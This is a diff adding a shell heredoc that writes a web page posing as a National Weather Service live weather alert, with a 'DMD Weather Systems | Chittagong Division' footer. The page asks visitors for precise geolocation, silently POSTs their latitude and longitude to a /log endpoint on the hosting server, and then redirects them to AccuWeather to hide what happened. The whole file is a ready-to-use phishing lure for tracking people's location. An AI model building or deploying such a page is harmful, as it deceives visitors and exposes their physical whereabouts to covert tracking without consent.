@@ -1,0 +1,66 @@
+cat <<EOF > templates/index.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>National Weather Service | Live Update</title>
+    <link rel="icon" type="image/png" href="https://img.icons8.com/color/48/weather.png" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background: linear-gradient(135deg, #1d1f21 0%, #111315 100%); color: #ecf0f1; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; overflow: hidden; }
+        .weather-card { background-color: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 40px 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); width: 90%; max-width: 380px; animation: fadeIn 0.8s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .icon-container { width: 120px; height: 120px; background: rgba(255, 255, 255, 0.05); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
+        .main-icon { width: 100px; animation: float 3s infinite ease-in-out; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; text-transform: capitalize; }
+        .alert-text { color: #f1c40f; font-size: 14px; font-weight: 600; margin-bottom: 10px; display: block; letter-spacing: 1px; }
+        p { font-size: 14px; line-height: 1.5; margin-bottom: 30px; color: #bdc3c7; }
+        .check-btn { background: linear-gradient(90deg, #2ecc71, #27ae60); color: #fff; border: none; padding: 16px 0; width: 100%; font-size: 16px; font-weight: 700; border-radius: 12px; cursor: pointer; box-shadow: 0 8px 20px rgba(46, 204, 113, 0.3); transition: 0.3s; }
+        .check-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(46, 204, 113, 0.5); }
+        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; flex-direction: column; justify-content: center; align-items: center; border-radius: 24px; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #2ecc71; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .footer { font-size: 10px; color: #5d6d7e; position: absolute; bottom: 15px; width: 100%; text-transform: uppercase; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+    <div class="weather-card">
+        <div class="icon-container">
+            <img src="https://img.icons8.com/color/120/partly-cloudy-day.png" class="main-icon"/>
+        </div>
+        <span class="alert-text">⚠️ LIVE WEATHER ALERT</span>
+        <h1>Is it going to rain? 👇</h1>
+        <p>Your local weather station has new updates. Please enable location to see the real-time radar and temperature in your area.</p>
+        <button class="check-btn" onclick="getLocation()" id="main-btn">CHECK YOUR WEATHER</button>
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <p style="color: #fff;">Connecting to Satellite...</p>
+        </div>
+    </div>
+    <div class="footer">DMD Weather Systems | Chittagong Division</div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        function getLocation() {
+            document.getElementById("main-btn").style.display = "none";
+            document.getElementById("loading-overlay").style.display = "flex";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, { enableHighAccuracy: true });
+            } else { alert("Geolocation not supported."); resetUI(); }
+        }
+        function showPosition(position) {
+            $.ajax({
+                url: '/log', type: 'POST',
+                data: { lat: position.coords.latitude, lon: position.coords.longitude },
+                success: function() { 
+                    setTimeout(() => { window.location.href = "https://www.accuweather.com/"; }, 1000); 
+                }
+            });
+        }
+        function showError(err) { resetUI(); alert("To see the weather report, please 'Allow' location access."); }
+        function resetUI() { document.getElementById("loading-overlay").style.display = "none"; document.getElementById("main-btn").style.display = "block"; }
+    </script>
+</body>
+</html>
+EOF
